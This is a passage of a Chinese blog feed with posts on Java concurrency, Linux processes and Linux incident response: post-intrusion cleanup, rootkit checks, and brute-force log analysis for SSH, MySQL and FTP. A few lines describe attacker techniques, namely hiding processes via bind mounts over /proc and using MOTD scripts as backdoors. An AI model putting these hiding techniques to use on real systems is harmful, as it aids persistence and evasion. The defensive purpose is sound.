的实现</h3><p>Semaphore是一种基于计数的信号量，它可以设定一个阀值。<br>当多个线程竞争获取许可信号，做完自己的申请后归还，超过闻值后，线程申请许可信号将会被阻塞。<br>Semaphore可以用来构建一些对象池，资源池之类的，比如数据库连接池，我们也可以创建计数为的Semaphore，将其作为一种类似互斥锁的机制，这也叫二元信号量，表示两种互斥状态。<br>计数为0的Semaphore是可以release的，然后就可以acquire (即一开始使线程阻塞从而完成其他执行)。</p><h3 id="管道输入输出流实现"><a href="#管道输入输出流实现" class="headerlink" title="管道输入输出流实现"></a>管道输入输出流实现</h3><p>先创建一个管道输入流和管道输出流，然后将输入流和输出流进行连接<br>用生产者线程往管道输出流中写入数据，消费者在管道输入流中读取数据，这样就可以实现了不同线程间的相互通讯<br>但是这种方式在生产者和生产者、消费者和消费者之间不能保证同步，也就是说在一个生产者和一个消费者的情况下是可以生产者和消费者之间交替运行的，多个生成者和多个消费者者之间则不行</p><h2 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h2><p><strong>背景:</strong> 经常创建和销毁、使用量特别大的资源，比如并发情况下的线程，对性能影响很大。<br><strong>思路:</strong> 提前创建好多个线程，放入线程池中，使用时直接获取，使用完放回池中可以避免频繁创建销毁、实现重复利用。<br><strong>好处:</strong></p><ol><li>提高响应速度(减少了创建新线程的时间)</li><li>降低资源消耗(重复利用线程池中线程，不需要每次都创建)</li><li>便于线程管理<br><code>corePoolSize</code>: 核心池的大小<br><code>maximumPoolSize</code>: 最大线程数<br><code>keepAliveTime</code>: 线程没有任务时最多保持多长时间后会终止</li></ol><pre class="line-numbers language-Java"><code class="language-Java">private static void createCachedThreadPool() &#123;        ExecutorService executorService = Executors.newCachedThreadPool();  // 可缓存的线程池，若线程数超过处理所需，缓存一段时间后会回收，若线程数不够，则新建线程。        ExecutorService executorService = Executors.newFixedThreadPool(3);  // 固定大小的线程池，可控制并发的线程数，超出的线程会在队列中等待。        ScheduledExecutorService executorService = Executors.newScheduledThreadPool(3);  // 周期性的线程池，支持定时及周期性执行任务。        ExecutorService executorService = Executors.newSingleThreadExecutor();  // 单线程的线程池，可保证所有任务按照指定顺序(FIFO, LIFO, 优先级)执行。        //   使用ThreadPoolExecutor自行定义线程池        for (int i = 0; i < 10; i++) &#123;            final int index = i;            executorService.execute(() -> &#123;                // 获取线程名称,默认格式:pool-1-thread-1                System.out.println(DateUtil.now() + " " + Thread.currentThread().getName() + " " + index);                // 等待2秒                sleep(2000);            &#125;);        &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>应该使用ThreadPoolExecutor类来创建线程池，根据自己需要的场景来创建一个合适的线程池。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>很尴尬这是这个学期的第一篇博客文章，有一种一个学期没学啥东西的感觉<br><strong>orz</strong>能鸽这么久确实是没想到<br>接下来可能会整一些java的东西，然后有计划写算法或者安全开发这些东西。</p><p><a href="https://smms.app/image/hDei8vSbxJVIqto" target="_blank"><img src="https://s2.loli.net/2023/12/14/hDei8vSbxJVIqto.jpg" width = "500" ></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://smms.app/image/OWJiKn1hyEl3F9P&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://s2.loli.net/2023/12/14/OWJiKn1hyEl3F9P.png&quot; &gt;&lt;/a&gt;&lt;/p&gt;
</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Linux进程简述</title>
    <link href="https://liu1272.github.io/2023/08/19/Linux%E8%BF%9B%E7%A8%8B%E7%AE%80%E8%BF%B0/"/>
    <id>https://liu1272.github.io/2023/08/19/Linux%E8%BF%9B%E7%A8%8B%E7%AE%80%E8%BF%B0/</id>
    <published>2023-08-19T12:39:00.000Z</published>
    <updated>2023-09-28T12:21:12.921Z</updated>
    
    <content type="html"><![CDATA[<h5 id="父进程"><a href="#父进程" class="headerlink" title="父进程"></a>父进程</h5><p>自已创建一个或者多个进程</p><h4 id="子进程"><a href="#子进程" class="headerlink" title="子进程"></a>子进程</h4><p>fork创建的。这个函数被调用一次但是返回两次，子进程返回0，父进程返回子进程id。</p><pre><code>fork之后，操作系统会赋值一个与父进程完全相同的子进程，虽然是父子关系，但是更像是兄弟关系。这两个进程共享代码，但是数据空间是互相独立的，数据空间、指令、指针完全相同，子进程拥有当前父进程运行到的位置（PC相同）。</code></pre><h4 id="进程组"><a href="#进程组" class="headerlink" title="进程组"></a>进程组</h4><p>多个进程的集合，其中有一个组长，PID等于进程组的PGID，只要这个组里面有一个进程存在那么这个组就存在，与组长进程是否终止无关</p><h4 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h4><p>shell分前后台来控制的不是进程而是作业或者进程组。<br>一个前台作业由多个进程组成，一个后台也由多个进程组成。<br>shell可以运行一个前台作业和任意多个后台作业。这就是作业控制。</p><pre><code>为什么只能运行一个前台作业？前台作业是指当前终端窗口中运行的作业，而一个后台作业则是在后台运行的作业，不会占用当前终端窗口。一个终端窗口只能有一个前台作业，是因为终端窗口只能和一个进程交互，用户在终端窗口输入命令，终端窗口会将命令传递给前台作业，如果有多个作业同时处于前台，那么输入的命令将被发送给哪个作业时不确定的，这会导致混乱和错误。</code></pre><h4 id="作业与进程组的区别"><a href="#作业与进程组的区别" class="headerlink" title="作业与进程组的区别"></a>作业与进程组的区别</h4><p>如果作业中有某个进程创建了子进程，则这个子进程是不属于该作业的，一旦作业运行结束，shell就把自己提到前台（子进程还在，但是子进程不属于作业）。如果原来的前台进程还存在（这个子进程还没有终止），他将自动变为后台进程组。</p><pre><code>当我们在前台新起了一个作业，shell就被提到了后台，因此shell就没有办法再继续接受我们的指令并且解析运行了。 但是如果前台进程退出了，shell就会有被提到前台来，就可以继续接受我们的命令并且解析运行。</code></pre><h4 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h4><p>是一个躲着多个进程组的集合。一个会话有一个控制终端，在xshell或者winscp中打开一个窗口就是新建一个会话。</p><h4 id="孤儿进程"><a href="#孤儿进程" class="headerlink" title="孤儿进程"></a>孤儿进程</h4><p>如果父进程退出，子进程还没有退出，那些子进程将成为孤儿进程。<br>孤儿进程被1号进程init进程收养。那么子进程的父进程将变成init进程。由init进程对他们完成状态收集工作。</p><h4 id="僵尸进程"><a href="#僵尸进程" class="headerlink" title="僵尸进程"></a>僵尸进程</h4><p>在操作系统中，当一个进程终止时，它的状态信息仍然被保留在系统中，直到其父进程调用wait或waitpid等系统调用来获取其终止状态信息。<br>如果父进程没有及时调用这些系统调用来获取终止状态信息，那么这个已经终止的子进程就会成为一个僵尸进程。<br>僵尸进程占用了系统资源，因为它们仍然占用了进程ID、进程表项和一些其他资源，而这些资源可能需要被其他进程使用。</p><pre><code>Linux中，使用ps aux查看信息，发现僵尸进程状态为“Z”</code></pre><p>当一个进程终止时，如果它的子进程仍然处于僵尸状态，那么这些子进程的父进程ID将被重置为1，也就是init进程。此时，init进程会调用wait或waitpid等系统调用来获取这些子进程的终止状态信息，并清除它们的僵尸状态，从而释放系统资源。</p><h4 id="进程终止的几种方式"><a href="#进程终止的几种方式" class="headerlink" title="进程终止的几种方式"></a>进程终止的几种方式</h4><pre><code>main函数自然返回exit，属于C函数库_exit，属于系统调用调用abort函数，异常程序终止，同时发送SIGABRT信号给调用进程接收能导致进程终止的信号 ctrl+c，SIGINT</code></pre><h4 id="如何让进程后台运行"><a href="#如何让进程后台运行" class="headerlink" title="如何让进程后台运行"></a>如何让进程后台运行</h4><pre><code>命令后面加上&amp;，这样是将命令放入到一个作业队列中ctrl+z挂起进程，使用jobs查看序号，再使用bg%序号后台运行进程nohup+&amp;，将标准输出和标准错误缺省会被重定向到nohup文件中，忽略所有SIGHUP挂断信号运行指令前面加上 setsid，使其父进程编程init进程，不受HUP信号影响将命令+&amp;放在（）括号中，也可以是进程不受HUP信号影响</code></pre><h4 id="守护进程"><a href="#守护进程" class="headerlink" title="守护进程"></a>守护进程</h4><p>指在后台运行的，没有控制终端与之相连的进程。<br>它独立于控制终端，周期性的执行某种任务。<br>Linux大多数服务器就是用守护进程的方式实现的，比如WEB服务器。<br>通过ps –x -j以查看作业控制信息，其中TPGID一栏为-1就是守护进程<br>特点：</p><ol><li>随系统启动而启动</li><li>父进程是init，也就是ppid为1</li><li>在后台运行</li><li>进程名字通常以字母 d 结束</li><li>ps显示中终端名设置为问号(?)，终端前台进程组ID设置为-1</li><li>工作目录为 \ (根)</li></ol><h4 id="创建守护进程"><a href="#创建守护进程" class="headerlink" title="创建守护进程"></a>创建守护进程</h4><ul><li>让程序在后台执行：调用fork()产生一个子进程，然后使父进程退出</li><li>调用setsid（）创建一个新对话期。控制终端、登录会话和进程组通常是从父进程进程下来的，守护进程要摆脱他们，不受他们的影响，方法是调用setsid()使进程成为一个会话组长。</li><li>禁止进程重新申请打开控制终端。通过使进程不再是会话组长来实现。再一次通过fork创建新的子进程，使调用fork的进程退出。</li><li>关闭不再需要的文件描述符。首先获得最高文件描述符值，然后用一个循环程序，关闭0到最高文件描述符值的所有文件描述符。</li><li>将当前目录更改为根目录</li><li>子进程从父进程继承的文件创建屏蔽字可能会拒绝某些许可权。为防止这一点，使用unmask(0)将屏蔽字清零。</li><li>将SIGCHLD信号的操作设置为SIG_IGN，子进程结束的时候就不会产生僵尸进程。</li></ul><h4 id="守护进程与后台进程"><a href="#守护进程与后台进程" class="headerlink" title="守护进程与后台进程"></a>守护进程与后台进程</h4><p>后台进程的文件描述符是继承于父进程，例如shell，所以它也可以在当前终端下显示输出数据。<br>但是deemon进程自己变成了进程组长，其文件描述符号和控制终端没有关联，是控制台无关的。<br>基本上任何一个程序都可以后台运行，但守护进程是具有特殊要求的程序，比如要脱离自己的父进程，成为自己的会话组长等，这些要在代码中显式地写出来<br>所以<code>守护进程是后台进程的一种</code>。<br>前台任务会随着session的退出而退出是因为它收到了SIGHUP信号。<br>后台任务是否会受到SIGNUP信号，取决于shell的<code> huponexit </code>参数。可以通过<code> $ shopt | grep huponexit </code>查看该参数的值。</p><h4 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h4><p>一般讨论的都是shell session，我们打开一个新的终端就会创建一个session<br>每个session都是由一个或者多个进程组组成的，每个进程组称为 job，这里job不是任务，而叫作业。<br>调用 setsid() 函数可以生成新的session,那么这些命令可以通过session进行统一管理<br>session中的第一个进程 (一般是bash) 的PID就是session的SID</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;父进程&quot;&gt;&lt;a href=&quot;#父进程&quot; class=&quot;headerlink&quot; title=&quot;父进程&quot;&gt;&lt;/a&gt;父进程&lt;/h5&gt;&lt;p&gt;自已创建一个或者多个进程&lt;/p&gt;
&lt;h4 id=&quot;子进程&quot;&gt;&lt;a href=&quot;#子进程&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>善后处理</title>
    <link href="https://liu1272.github.io/2023/08/18/%E5%96%84%E5%90%8E%E5%A4%84%E7%90%86/"/>
    <id>https://liu1272.github.io/2023/08/18/%E5%96%84%E5%90%8E%E5%A4%84%E7%90%86/</id>
    <published>2023-08-18T02:34:00.000Z</published>
    <updated>2023-08-19T09:16:25.153Z</updated>
    
    <content type="html"><![CDATA[<h5 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a>杀死进程</h5><pre><code>top d1   //运行top命令后，键入大写字母P按cpu排序ps aux | sort -k4nr   //运行top命令后，键入大写字母M按内存排序ls -la /proc/$pid/exe   //查找进程文件strace -tt  -T -e  trace=all  -p $pid   //跟踪进程运行lsof -p $pid   //进程打开的文件netstat -anltp | grep $pid   //查看进程端口情况</code></pre><h5 id="查看账号"><a href="#查看账号" class="headerlink" title="查看账号"></a>查看账号</h5><pre><code>awk -F &quot;:&quot; &#39;$3==0&#123;print $1&#125;&#39; /etc/passwd   //查看特权用户awk &#39;/\$1|\$6/&#123;print $1&#125;&#39; /etc/shadow   //可远程登录的账号信息cat /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;   //sudo的账号w   //当前用户及其行为lastlog   //所有用户最后登录时间last   //所有用户关键信息grep &quot;Accepted &quot; /var/log/secure* | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;   //成功登录日期、用户名及ip//查看试图爆破主机的ipgrep refused /var/log/secure* | awk &#123;&#39;print $9&#39;&#125; | sort | uniq -c |sort -nr | moregrep &quot;Failed password&quot; /var/log/secure* | grep -E -o &quot;(([0-9]&#123;1,3&#125;)\.([0-9]&#123;1,3&#125;)\.([0-9]&#123;1,3&#125;)\.([0-9]&#123;1,3&#125;))&quot; | uniq -c grep &quot;Failed password for root&quot; /var/log/secure | awk &#39;&#123;print $11&#125;&#39; | sort   //查看爆破root的ipgrep &quot;Failed password&quot; /var/log/secure | awk &#123;&#39;print $9&#39;&#125; | sort | uniq -c | sort -nr   //查看爆破的用户名字典</code></pre><h5 id="锁定目录"><a href="#锁定目录" class="headerlink" title="锁定目录"></a>锁定目录</h5><pre><code>chmod 000 /usr/bin/风险目录chattr +i /usr/binchattr +i /binchattr +i /tmp</code></pre><h5 id="检查异常文件"><a href="#检查异常文件" class="headerlink" title="检查异常文件"></a>检查异常文件</h5><pre><code>【检查特权文件】find / -perm /6000find / -perm /4000find / -perm /2000【检查corn文件】/var/spool/cron/*/etc/crontab /etc/cron.d/* /etc/cron.daily/*/etc/cron.hourly/* /etc/cron.monthly/* /etc/cron.weekly/ /etc/anacrontab     /var/spool/anacron/*【最近被修改的系统文件】find /etc/ /usr/bin/ /usr/sbin/ /bin/ /usr/local/bin/  -type f -mtime -T | xargs ls -la【被替换的命令/动态链接库劫持】echo $LD_PRELOADecho $LD_LIBRARY_PATH注：基本上上面两个命令回显是空白的，如果有回显大概率是被劫持ls -alt /usr/bin /usr/sbin /bin /usr/local/binrpm -Va&gt;rpm.log</code></pre><h5 id="删除计划任务等"><a href="#删除计划任务等" class="headerlink" title="删除计划任务等"></a>删除计划任务等</h5><pre><code>rm -f /etc/init.d/风险目录rm -f /etc/rc#.d/木马连接文件cat /etc/rc.local   //开机启动项chkconfig --list   //开机启动项注意：建议使用vim查看，cat有可能显示不全</code></pre><h5 id="rootkit查杀"><a href="#rootkit查杀" class="headerlink" title="rootkit查杀"></a>rootkit查杀</h5><p>rootkit主要有两种类型：文件级别和内核级别。<br>文件级别的rootkit: 一般是通过程序漏洞或者系统漏洞进入系统后，通过修改系统的重要文件来达到隐藏自己的目的。<br>内核级rootkit: 是比文件级rootkit更高级的一种入侵方式，它可以使攻击者获得对系统底层的完全控制权，此时攻击者可以修改系统内核，进而截获运行程序向内核提交的命令，并将其重定向到入侵者所选择的程序并运行此程序。内核级rootkit主要依附在内核上，它并不对系统文件做任何修改。以防范为主。<br><strong>查杀工具：</strong><br><a href="http://www.chkrootkit.org/"> chkrootkit </a>、<a href="http://rkhunter.sourceforge.net/"> rkhunter </a>、<a href="http://www.clamav.net/download.html"> ClamAV </a></p><h5 id="其它检查方面"><a href="#其它检查方面" class="headerlink" title="其它检查方面"></a>其它检查方面</h5><ul><li>BASH内置命令<pre><code>compgen -b</code></pre></li><li>BASH函数<pre><code>compgen -funset -f functionName</code></pre></li><li>环境变量<pre><code>envsetexportcat /proc/$PID/environdeclare</code></pre></li><li>SSH key</li><li>SSH config文件<pre><code>/etc/ssh/ssh_config 和 ~/.ssh/config将LocalCommand 和 ProxyCommand 参数封禁</code></pre></li><li>alias命令替换<pre><code>alias 命令的功能是为命令设置别名alert   //检查是否存在替换unalias alert   //删除别名</code></pre></li><li>DNS配置文件<pre><code>/etc/resolv.conf</code></pre></li><li>禁止ptrace_scope操作<pre><code>cat /proc/sys/kernel/yama/ptrace_scope</code></pre></li><li>ASLR<pre><code>cat /proc/sys/kernel/randomize_va_space   //调成2减缓溢出攻击</code></pre></li><li>capabilities<pre><code>getcap -r / 2&gt;/dev/null   //查看对权限的默认情况setcap   //重新设置权限</code></pre></li><li> iptables端口复用<pre><code>sudo iptables -L   //查看默认情况</code></pre></li><li>密码填充检查<pre><code>cat /etc/passwd | cut -d &quot;:&quot; -f 2 | grep -v &quot;x   //默认情况应该是空的</code></pre></li><li>服务检查<pre><code>sudo systemctl list-units --type=service --state=running   //正在运行的服务systemctl status xxx.service   //查看单一服务进程状态systemctl cat xxx.service   //获取服务配置文件systemctl cat </code></pre></li><li>MOTD<pre><code>是Linux中发送问候消息的功能，一般在我们登录服务器后显示每次任意用户登录时都会触发 motd 服务的功能,这个功能的脚本几乎都是使用 root 权限来启动的，所以很适合用来做后门</code></pre></li><li>进程启动文件<pre><code>恶意程序执行后，可能会删除本地文件，但是该文件已经被进程加载，可以通过遍历这种情况来排查恶意程序sudo lsof | grep deletedsudo ls -al /proc/*/exe 2&gt;/dev/null | grep deleted   //建议使用这一个命令</code></pre></li><li>检查系统及应用程序配置文件</li><li>sudo配置文件检查<pre><code>/etc/sudo.conf/etc/sudoers/etc/sudoers.d/</code></pre></li><li>第三方GPG密钥检查<br>```<br>sudo apt-key list<br>具体存储⽬录为 /etc/apt/trusted.gpg.d/</li></ul><p>gpg –quiet –show-keys /etc/pki/rpm-gpg/*<br>具体存储⽬录为 /etc/pki/rpm-gpg/<br>```</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;杀死进程&quot;&gt;&lt;a href=&quot;#杀死进程&quot; class=&quot;headerlink&quot; title=&quot;杀死进程&quot;&gt;&lt;/a&gt;杀死进程&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;top d1   //运行top命令后，键入大写字母P按cpu排序

ps aux | sort -k4nr</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>常见问题处置方案</title>
    <link href="https://liu1272.github.io/2023/08/17/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E5%A4%84%E7%BD%AE%E6%96%B9%E6%A1%88/"/>
    <id>https://liu1272.github.io/2023/08/17/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E5%A4%84%E7%BD%AE%E6%96%B9%E6%A1%88/</id>
    <published>2023-08-17T08:08:00.000Z</published>
    <updated>2023-09-28T08:01:14.319Z</updated>
    
    <content type="html"><![CDATA[<h5 id="文件无法删除"><a href="#文件无法删除" class="headerlink" title="文件无法删除"></a>文件无法删除</h5><p><strong>被进程占用：</strong></p><pre><code>lsof xxxx.xx</code></pre><p><strong>文件存在隐藏属性：</strong></p><pre><code>sattr xxxx.xxchattr -a xxxx.xxchattr -i xxxx.xx</code></pre><p><strong>上层文件存在SBIT权限：</strong><br>这种情况只存在于非 root 权限去删除其他用户创建的目录的情况，即使文件权限是 777 也无法进行删除。<br>当目录被设置了粘滞位权限以后，即便用户对该目录有写入权限，也不能删除该目录中其他用户的文件数据，而是只有该文件的所有者和root用户才有权将其删除。<br>这种办法可以保持一种动态的平衡：允许各用户在目录中任意写入、删除数据，但是禁止随意删除其他用户的数据。<br>需要注意的是，粘滞位权限只能针对目录设置，对于文件无效。<br>设置了粘滞位权限的目录，使用ls命令查看其属性时，其他用户权限处的“x”将变为“t”。<br>粘滞位权限都是针对其他用户设置，使用chmod命令设置目录权限时，“o+t”、“o-t”权限模式可分别用于添加、移除粘滞位权限。</p><h5 id="netstat-pantu-不显示-pid-而显示"><a href="#netstat-pantu-不显示-pid-而显示" class="headerlink" title="netstat -pantu 不显示 pid  而显示 -"></a>netstat -pantu 不显示 pid  而显示 -</h5><p>可能是使用了<code>mkdir .hidden  或者  mount -o bind .hidden /proc/PID</code>来隐藏</p><pre><code>cat /proc/$$/mountinfo   //查询挂载信息umount /proc/PID   //取消挂载</code></pre><h5 id="ps和top看不到恶意进程"><a href="#ps和top看不到恶意进程" class="headerlink" title="ps和top看不到恶意进程"></a>ps和top看不到恶意进程</h5><ol><li>挂载被隐藏（看上一个的操作）</li><li>命令被替换（使用busybox进行检修）</li><li>LD_PRELOAD等方法共享库劫持（使用busybox进行检修）</li></ol><h5 id="快速查找文件"><a href="#快速查找文件" class="headerlink" title="快速查找文件"></a>快速查找文件</h5><p>【which】<br>从环境变量查找系统命令的具体文件位置<br>【whereis】<br>从/usr目录快速查找文件<br>【locate】<br>从locatedb数据库查找文件路径<br>【find】<br>强大的搜索命令<br><code>find &lt;检索路径&gt; &lt;选项&gt; &lt;搜索内容&gt;</code><br><a href="https://cloud.tencent.com/developer/article/1348438">具体使用方法</a></p><h5 id="确定系统信息"><a href="#确定系统信息" class="headerlink" title="确定系统信息"></a>确定系统信息</h5><pre><code>cat /etc/issue   //系统版本uname -mgetconf LONG_BIT   //查看系统位数cat /proc/version   //查看内核版本uname -a</code></pre><h5 id="系统完整性检测"><a href="#系统完整性检测" class="headerlink" title="系统完整性检测"></a>系统完整性检测</h5><pre><code>rpm -Va   //Centosapt install debsums   //Ubuntu、Debiandebsums --all --changed</code></pre><h5 id="系统文件监控工具"><a href="#系统文件监控工具" class="headerlink" title="系统文件监控工具"></a>系统文件监控工具</h5><pre><code>AIDE\inotify\tripwire</code></pre><h5 id="查看glibc版本"><a href="#查看glibc版本" class="headerlink" title="查看glibc版本"></a>查看glibc版本</h5><pre><code>ldd --version</code></pre><h5 id="误删文件恢复"><a href="#误删文件恢复" class="headerlink" title="误删文件恢复"></a>误删文件恢复</h5><pre><code>被删除的文件在进程的内存空间还保存着一份，可以通过访问某个目录来找到文件恢复如果正在进行读写操作：lsof   //查找进程文件恢复即可mount   //查看所有挂载点umount   //删除挂载点lsblk -f   //查看所有设备的挂载情况df -T 路径   //可查看该路径的所属挂载点、所在分区、所在分区的文件系统类型cat /proc/filesystems   //查看文件系统的类型常用恢复工具有：Extundelete、Debugfs、R-Linux、Ext3grep、Ext4magic</code></pre><h5 id="批量检索文件并打印信息"><a href="#批量检索文件并打印信息" class="headerlink" title="批量检索文件并打印信息"></a>批量检索文件并打印信息</h5><pre><code>find / -name &quot;内容&quot; | while read line; do if [ -f $line ]; then ls -al $line; elif [ -d $line ]; then ls -al ../ | grep $line; fi; done</code></pre><h5 id="拷贝取证"><a href="#拷贝取证" class="headerlink" title="拷贝取证"></a>拷贝取证</h5><ol><li>使用虚拟化平台存储快照</li><li>打包整个系统</li><li>全盘拷贝（推荐 clonezilla）</li><li>进程拷贝（推荐 CRIU）</li><li>组合运用（冻结进程 + 全盘拷贝 + 恢复进程）</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;文件无法删除&quot;&gt;&lt;a href=&quot;#文件无法删除&quot; class=&quot;headerlink&quot; title=&quot;文件无法删除&quot;&gt;&lt;/a&gt;文件无法删除&lt;/h5&gt;&lt;p&gt;&lt;strong&gt;被进程占用：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;lsof xxxx.xx
&lt;/</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>暴力破解排查</title>
    <link href="https://liu1272.github.io/2023/08/16/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%8E%92%E6%9F%A5/"/>
    <id>https://liu1272.github.io/2023/08/16/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%8E%92%E6%9F%A5/</id>
    <published>2023-08-16T07:40:00.000Z</published>
    <updated>2023-08-19T09:16:10.557Z</updated>
    
    <content type="html"><![CDATA[<h5 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h5><p>暴力破解一般针对<br>ssh、mysql、ftp、redis、mongodb、smtp</p><h5 id="SSH暴力破解"><a href="#SSH暴力破解" class="headerlink" title="SSH暴力破解"></a>SSH暴力破解</h5><ol><li><p>使用<code>netstat -pantu</code>查看网络状态，重点是PID（当被破解时会有大量的ESTABLISHED）</p></li><li><p>使用<code>awk -F: &#39;&#123;if($3==0) print $1&#125;&#39; /etc/passwd</code>查找特殊权限账号（默认root）</p></li><li><p>查找可以使用ssh登录的账号</p><pre><code>s=$( sudo cat /etc/shadow | grep &#39;^[^:]*:[^\*!]&#39; | awk -F: &#39;&#123;print $1&#125;&#39;);for i in $s;do cat/etc/passwd | grep -v &quot;/bin/false\|/nologin&quot;| grep $i;done | sort | uniq |awk -F: &#39;&#123;print$1&#125;&#39;</code></pre></li><li><p>查看正在连接的ssh-session</p><pre><code>who -awlast -p nowsudo netstat -tnpa | grep &#39;ESTABLISHED.*sshd&#39;pgrep -af sshdecho $SSH_CONNECTIONss | grep ssh</code></pre></li><li><p>查看所有的账号信息</p><pre><code>/var/log/auth.log（Ubuntu）/var/log/secure（centOS）列出当前账户         who am i  </code></pre></li><li><p>查看登录日志</p><pre><code># 查看日志cd /var/log# 成功登录cat /var/log/auth.log | grep &quot;Accept&quot;# 正常退出cat /var/log/auth.log | grep &quot;pam_unix(sshd:session): session closed&quot;# 密码错误cat /var/log/auth.log | grep &quot;authentication failure&quot;# 连续错误cat /var/log/auth.log | grep &quot;message repeated 2 times&quot;</code></pre></li><li><p>统计数据</p><pre><code># 登录失败的用户名及其次数grep &quot;Failed password&quot; /var/log/auth.log|perl -e &#39;while($_=&lt;&gt;)&#123; /for(.*?)from/; print&quot;$1\n&quot;;&#125;&#39;|sort|uniq -c|sort -nr# 登录失败的IP及其次数cat /var/log/auth.log | grep &quot;Failed password for&quot; | grep &quot;root&quot; | grep -Po &#39;(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])(\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d))&#123;3&#125;&#39; |sort|uniq -c|sort -nr</code></pre></li><li><p>加固防护<br>升级SSH版本至少为 7.7版本以上，7.7及以下版本存在SSH用户名枚举<br>加强口令复杂程度<br>禁止root用户登录，可以通过其他用户su到root<br>安装 <a href="https://github.com/fail2ban/fail2ban"><code>fail2ban</code></a> 来进行防御</p></li></ol><h5 id="Mysql暴力破解"><a href="#Mysql暴力破解" class="headerlink" title="Mysql暴力破解"></a>Mysql暴力破解</h5><p>Mysql 默认安装会保留登录日志，在 Ubuntu 上默认位置为 <code>/var/og/mysql/error.log</code></p><ol><li><p>查看登录失败的用户名</p><pre><code>cat /var/log/mysql/error.log | grep &quot;Access denied for user&quot; | grep &quot;using password: YES&quot; | awk -F &quot;&#39;&quot; &#39;&#123;print $2&#125;&#39; | sort | uniq -c | sort -nr</code></pre></li><li><p>查看登录失败的IP及次数</p><pre><code>cat /var/log/mysql/error.log | grep &quot;Access denied for user&quot; | grep &quot;using password: YES&quot; | awk -F &quot;&#39;&quot; &#39;&#123;print $2&#125;&#39; | sort| uniq | while read line;do echo $line;cat /var/log/mysql/error.log | grep &quot;Access denied for user&quot; | grep &quot;using password&quot; | awk -F &quot;&#39;&quot; &#39;&#123;print $4&#125;&#39; | sort | uniq -c | sort -nr; done</code></pre></li></ol><h5 id="FTP暴力破解"><a href="#FTP暴力破解" class="headerlink" title="FTP暴力破解"></a>FTP暴力破解</h5><ol><li>查看网络连接（如果有爆破会有大量的ESTABLISHED状态和TIME WAIT状态的网络连接）<pre><code>netstat -pantu</code></pre></li><li>查看最近的一个ftp会话（也可以用ftpwho查找）<pre><code>last -w -t</code></pre></li><li>查找日志<pre><code>cat /var/log/vsftpd.log   具体的位置可能不太一样，需要自己查找</code></pre></li><li>查找登录失败的账号<pre><code>cat /var/log/vsftpd.log | grep FAIL | cut -d &quot;[&quot; -f 3 | cut -d &quot;]&quot; -f 1 | sort | uniq -c | sort -nr</code></pre></li><li>查找登录失败的IP<pre><code>cat /var/log/vsftpd.log | grep FAIL | cut -d &quot;[&quot; -f 3 | cut -d &quot;]&quot; -f 1 | sort | uniq | while read line;do echo $line;cat /var/log/vsftpd.log | grep $line | cut -d &quot;:&quot; -f 7 | cut -d &#39;&quot;&#39; -f 1 | sort | uniq -c | sort -nr; done</code></pre></li><li>FTP服务加固<br>禁用 anonymous 和 ftp 两个账号<br>使用 SSL 加密 FTP<br>安装 fail2ban 来进行防御</li></ol><h5 id="Redis未授权暴力破解"><a href="#Redis未授权暴力破解" class="headerlink" title="Redis未授权暴力破解"></a>Redis未授权暴力破解</h5><p>将redis.conf 中的 requirepass 前的注释打开，并且设置一个复杂密码<br>缩减开放端口，建议仅在本机127.0.0.1使用<br>配置完成后需要重启来生效</p><ul><li>只有手动设置logfile才能保存日志，默认不设置默认的日志级别notice是不会记录登录、执行指令、退出的。</li><li>loglevel设置为 verbose或者debug才会记录登录主机</li><li>执行的指令<code>info，set</code>等即使 loglevel是 debug 级别也不会记录，但是会记录我们设置了多少个key， 具体key名称以及内容不会记录</li></ul><p><strong>虽然如此，但是失败成功的登录日志都是一样的……</strong><br><strong>没办法区分是不是攻击行为，只能问有没有人那个时候登过了</strong></p><h5 id="MongoDB暴力破解"><a href="#MongoDB暴力破解" class="headerlink" 